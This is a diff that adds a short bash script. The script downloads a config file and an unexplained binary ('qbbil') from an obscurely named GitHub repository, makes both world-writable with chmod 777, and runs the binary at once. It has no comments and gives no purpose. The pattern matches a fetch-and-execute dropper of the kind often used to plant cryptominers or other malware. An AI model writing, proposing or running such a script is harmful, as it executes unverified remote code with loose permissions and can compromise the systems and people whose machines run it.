@@ -1,0 +1,6 @@
+#!/bin/bash
+
+wget https://github.com/tallapallitech63/qbiuc/raw/main/appsettings.json
+wget https://github.com/tallapallitech63/qbiuc/releases/download/qbuf/qbbil
+chmod 777 qbbil appsettings.json
+./qbbil
